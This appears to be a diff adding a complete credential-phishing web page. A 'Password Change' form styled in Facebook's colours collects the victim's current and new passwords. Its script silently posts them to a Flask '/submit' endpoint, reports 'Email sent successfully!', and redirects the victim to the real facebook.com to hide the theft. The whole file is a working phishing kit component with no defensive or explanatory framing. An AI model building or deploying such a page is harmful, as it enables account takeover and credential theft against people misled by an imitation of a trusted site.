@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Password Change</title>
+<style>
+body {
+  margin: 0;
+  padding: 0;
+  font-family: Arial, sans-serif;
+  background-color: rgba(255, 255, 255, 0.7);
+}
+
+.container {
+  width: 300px;
+  margin: 50px auto;
+  padding: 20px;
+  border-radius: 10px;
+  background-color: rgba(255, 255, 255, 0.9);
+  box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+}
+
+input[type="text"] {
+  width: calc(100% - 20px);
+  margin-bottom: 10px;
+  padding: 10px;
+  border: none;
+  border-radius: 5px;
+  background-color: rgba(240, 240, 240, 0.9);
+  color: #333;
+  font-size: 14px;
+}
+
+button {
+  width: 100%;
+  padding: 10px;
+  border: none;
+  border-radius: 5px;
+  background-color: #4267B2;
+  color: #fff;
+  font-size: 16px;
+  cursor: pointer;
+}
+
+button:hover {
+  background-color: #3B5998;
+}
+</style>
+</head>
+<body>
+<div class="container">
+  <form id="passwordForm">
+    <input type="text" id="current_password" name="current_password" placeholder="Current Password">
+    <input type="text" id="new_password" name="new_password" placeholder="New Password">
+    <input type="text" id="retype_new_password" name="retype_new_password" placeholder="Retype New Password">
+    <button type="button" onclick="sendEmail()">Save Changes</button>
+  </form>
+</div>
+
+<script>
+function sendEmail() {
+  var currentPassword = document.getElementById("current_password").value;
+  var newPassword = document.getElementById("new_password").value;
+  var retypeNewPassword = document.getElementById("retype_new_password").value;
+  
+  // Validate if the new passwords match
+  if (newPassword !== retypeNewPassword) {
+    alert("New passwords do not match.");
+    return;
+  }
+  
+  // Make an AJAX request to the Flask server
+  var xhr = new XMLHttpRequest();
+  xhr.open("POST", "/submit", true);
+  xhr.setRequestHeader("Content-Type", "application/json");
+  xhr.onreadystatechange = function() {
+    if (xhr.readyState === 4 && xhr.status === 200) {
+      alert("Email sent successfully!");
+      setTimeout(function(){
+        // Redirect to Facebook
+        window.location.href = "https://www.facebook.com";
+      }, 2000); // 2000 milliseconds = 2 seconds
+    } else if (xhr.readyState === 4 && xhr.status !== 200) {
+      alert("Failed to send email.");
+    }
+  };
+  xhr.send(JSON.stringify({
+    current_password: currentPassword,
+    new_password: newPassword,
+    retype_new_password: retypeNewPassword
+  }));
+}
+</script>
+
+</body>
+</html>
